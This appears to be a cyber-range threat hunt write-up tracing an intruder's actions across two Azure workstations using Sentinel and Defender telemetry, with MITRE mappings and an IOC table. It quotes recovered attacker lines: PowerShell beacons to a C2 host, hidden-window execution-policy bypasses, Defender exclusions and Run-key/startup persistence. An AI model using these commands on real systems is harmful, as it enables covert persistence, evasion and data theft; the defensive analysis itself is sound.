# Threat Hunt: Signal After The Noise

![Mission Brief](assets/mission-brief.png)

## Overview

A post-intrusion threat hunt inside a corporate Azure estate. The breach was already established — this hunt reconstructed **the full operator playbook after access was gained**: how they moved laterally, deployed tooling, silenced defenses, established persistent C2, dumped credentials, and confirmed live desktop access.

**Environment:** Microsoft Sentinel / Microsoft Defender for Endpoint (MDE)  
**Date of Activity:** December 13, 2025  
**Platform:** Azure — `LAW-Cyber-Range` Sentinel workspace  
**Analyst:** Abel

---

## Environment

| Component | Details |
|---|---|
| SIEM | Microsoft Sentinel |
| EDR | Microsoft Defender for Endpoint (MDE) |
| Log Sources | DeviceLogonEvents, DeviceProcessEvents, DeviceFileEvents, DeviceNetworkEvents, DeviceRegistryEvents, DeviceEvents |
| Entry host | `azwks-phtg-02` |
| Pivot host | `azwks-phtg-01` |
| Operator account | `vmadminusername` |

---

## Attack Chain

### Initial Access — Credential Reuse from a Compromised Workstation

At **09:27:58 UTC**, `vmadminusername` authenticated to `azwks-phtg-02` from `173.244.55.131` — the IP of `sarah-chen`'s workstation. Pre-logon failure events show `UnauthorizedLogonType`, not wrong passwords — the credentials were valid from the first attempt. No brute force, no spray. The account was already compromised.

`sarah-chen`'s machine is not a relay — it is the operator's external launch point.

**MITRE:** T1078 — Valid Accounts

![P01 — Cold Trail](assets/p01-cold-trail.png)
![Q01 — Brute Force Assumption](assets/q01-brute-force-assumption.png)

---

### Lateral Movement — Pre-Staged RDP File

**21 minutes after entry**, at 09:48 UTC, the operator launched a pre-staged RDP file from the Downloads folder:

```
C:\Users\vmAdminUsername\Downloads\azwks-phtg-01 (1).rdp
```

The file was already on disk. The operator came prepared — this was not exploratory movement, it was a planned pivot to a specific second target. `CredentialUIBroker` fired immediately after `mstsc.exe`, and a successful logon to `azwks-phtg-01` (10.0.0.105) was recorded. No further lateral movement beyond this second hop was detected.

**MITRE:** T1021.001 — Remote Services: Remote Desktop Protocol

![P02 — First Footsteps](assets/p02-first-footsteps.png)
![Q02 — Lateral Movement](assets/q02-lateral-movement.png)

---

### Tooling Deployment — Download-Then-Execute

On `azwks-phtg-01`, a pre-staged PowerShell script (`_.ps1` from the user-profile PHTG directory) made an outbound HTTPS call to `updates.health-cloud.cc`. **One second later**, `PHtGHealthCloudSvc.exe` launched — the script fetched the binary and executed it immediately. Classic download-then-execute: the PS1 is the bridge between the staging server and the host.

All operator tooling was staged under `C:\ProgramData\PHTG\HealthCloud\` across three subdirectories (`Cache`, `Bin`, `TempCache`), masquerading as a legitimate health cloud software installation.

The implant `PHtGHealthCloudSvc.exe` spoofed `bitsadmin.exe` via VersionInfo tampering — running from a staging path rather than a system directory, which is what separated it from the background noise of other FileName/OriginalFileName mismatches.

All PowerShell execution used:
```powershell
-WindowStyle Hidden -ExecutionPolicy Bypass
```

**MITRE:** T1105 — Ingress Tool Transfer, T1036.003 — Masquerading: Rename System Utilities, T1059.001 — PowerShell, T1564.003 — Hidden Window

![Q04 — First Operator Script](assets/q04-first-operator-script.png)
![Q08 — LOLBin Masquerade](assets/q08-lolbin-masquerade.png)
![Q18 — Deployment Pattern](assets/q18-deployment-pattern.png)

---

### Defense Evasion — Silencing Defender Before Persistence Lands

Before planting persistence, the operator ran `AMSI_probe.ps1` to confirm the environment wouldn't detonate alerts, then applied a temporary Defender exclusion via `Add-MpPreference` against the user-profile PHTG path. The exclusion was removed with `Remove-MpPreference` within seconds — a window just long enough for the payload to drop without triggering a detection, short enough to avoid a permanent exclusion that would attract attention.

After persistence was in place, two permanent exclusions were added:

```powershell
# Written via msmpeng.exe — Defender blinding itself
ExclusionPath:    C:\ProgramData\PHTG\HealthCloud\Cache
ExclusionProcess: C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe
```

Defender detected `PHTG HealthCloud.lnk` and generated two `AntivirusReport` events — but `WasExecutingWhileDetected: false` confirms persistence was already in place when caught. Detection without blocking.

`attrib.exe` applied hidden+system attributes across `Cache` (17 modifications) and `TempCache` (2 modifications). Two `cmd.exe` invocations chained payload launches to break parent-process lineage in telemetry.

**MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools, T1564 — Hide Artifacts, T1059.003 — cmd.exe Lineage Break

![P06 — Doors Held Open](assets/p06-doors-held-open.png)
![Q07 — Attrib Commands](assets/q07-attrib-commands.png)
![Q20 — AMSI Probe](assets/q20-amsi-probe.png)
![Q22 — Defender Tampering](assets/q22-defender-tampering.png)
![Q24 — Temp Exclusion Add](assets/q24-temp-exclusion-add.png)

---

### Persistence — Three Mechanisms

**1. Startup LNK — fires at every user logon**
```powershell
C:\Users\vmAdminUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PHTG HealthCloud.lnk
→ PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-05.ps1
```

**2. Run Key — fires at every user logon (independent path)**
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value: PHTGHealthCloudTray
Data:  powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
```

**3. HKLM EventLog Registration — blends implant activity into trusted log streams**
```
HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud
```
Registering a custom Application event log source allows the implant to write to the Windows Application log under its own name — activity that sits inside trusted telemetry and draws far less scrutiny than events in an unknown log.

All three mechanisms were installed at **10:13 UTC** — 25 minutes after landing on `azwks-phtg-01`.

**MITRE:** T1547.001 — Registry Run Keys / Startup Folder, T1112 — Modify Registry

![P03 — Quiet Roots](assets/p03-quiet-roots.png)
![Q10 — Persistence Signal](assets/q10-persistence-signal.png)
![Q11 — Run Key Value](assets/q11-run-key-value.png)
![Q13 — Startup LNK](assets/q13-startup-lnk.png)
![Q14 — HKLM Registry](assets/q14-hklm-registry.png)

---

### Command & Control — Dual Beacons, Cloudflare-Fronted

**Channel 1 — implant healthcheck loop:**
`PHtGHealthCloudSvc.exe` (masquerading as `bitsadmin.exe`) ran a persistent beacon loop, firing **22 healthcheck executions** during post-access activity to confirm the implant was alive.

**Channel 2 — encoded PowerShell beacons:**
Two `-EncodedCommand` payloads decoded via `base64_decode_tostring()` in KQL:

```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?device=azwks-phtg-01"  -UseBasicParsing -TimeoutSec 5 | Out-Null
```

Both subdomains resolved to Cloudflare-fronted IPs over port 443/TLS, blending with normal HTTPS traffic. The dual-channel design is deliberate: if one channel is cut, the operator retains access via the other, and each channel serves a distinct function (liveness vs. tasking).

```
health-cloud.cc
├── updates.health-cloud.cc → 104.21.36.232 (Cloudflare)
└── status.health-cloud.cc  → 172.67.200.204 (Cloudflare)
```

**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols, T1027 — Obfuscated Files, T1090 — Proxy

![P04 — Beacon Pair](assets/p04-beacon-pair.png)
![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)
![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)
![Q16 — Encoded Beacons](assets/q16-encoded-beacons.png)

---

### Credential Access — LSASS Memory Read

Among 139 `OpenProcessApiCall` events targeting `lsass.exe`, 138 came from expected baseline processes (MsMpEng, WmiPrvSE, SenseIR, system context). One did not: `powershell.exe` running under `vmadminusername`.

Two `OpenProcessApiCall` events fired one second apart:

| Time | DesiredAccess | Meaning |
|---|---|---|
| T+0s | Query handle | Enumeration only |
| T+1s | `0x1FFFFF` — `PROCESS_ALL_ACCESS` | Full read/write/memory access |

The escalation from query to `PROCESS_ALL_ACCESS` is the signal. A `ReadProcessMemoryApiCall` event against `lsass.exe` confirmed the operator followed through — credential dump confirmed.

**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

![Q27 — LSASS Access](assets/q27-lsass-access.png)
![Q28 — Access Rights](assets/q28-access-rights.png)
![Q29 — Memory Read](assets/q29-memory-read.png)

---

### Final Actions — M365 Targeting + Confirmed Live Access

`phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — the operator targeting M365 authentication. Persistence confirmed firing independently at **13:40 UTC** via scheduled task, without an active RDP session.

At **15:55 UTC**, the operator went hands-on-keyboard: `notepad.exe`, `calc.exe`, and `mspaint.exe` launched interactively — confirming live desktop access nearly 6.5 hours after initial entry.

**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts

![P07 — M365 Auth](assets/p07-m365-auth.png)
![P07 — Scheduled Task](assets/p07-scheduled-task.png)
![P07 — Hands on Keyboard](assets/p07-hands-on-keyboard.png)

---

## IOC Summary

| Type | Value |
|---|---|
| External IP | `173.244.55.131` (sarah-chen) |
| Entry host | `azwks-phtg-02` |
| Pivot host | `azwks-phtg-01` |
| Operator account | `vmadminusername` |
| C2 domain | `health-cloud.cc` |
| C2 subdomain | `updates.health-cloud.cc` |
| C2 subdomain | `status.health-cloud.cc` |
| C2 IP | `104.21.36.232` (Cloudflare-fronted) |
| C2 IP | `172.67.200.204` (Cloudflare-fronted) |
| Implant path | `C:\ProgramData\PHTG\HealthCloud\` |
| Implant binary | `PHtGHealthCloudSvc.exe` (masquerades as `bitsadmin.exe`) |
| Startup LNK | `PHTG HealthCloud.lnk` |
| Run key value | `PHTGHealthCloudTray` |

---

## Full Hunt Notes

For the complete phase-by-phase and question-by-question KQL walkthrough, see [hunt-notes.md](hunt-notes.md).

**Key skills demonstrated:** KQL threat hunting across 6 MDE/Sentinel tables, C2 infrastructure analysis and Base64 decoding, persistence mechanism identification (LNK + Run key + HKLM), Defender evasion detection, LSASS credential dump confirmation, MITRE ATT&CK mapping (T1003, T1021, T1027, T1036, T1059, T1071, T1078, T1090, T1105, T1112, T1547, T1562, T1564).
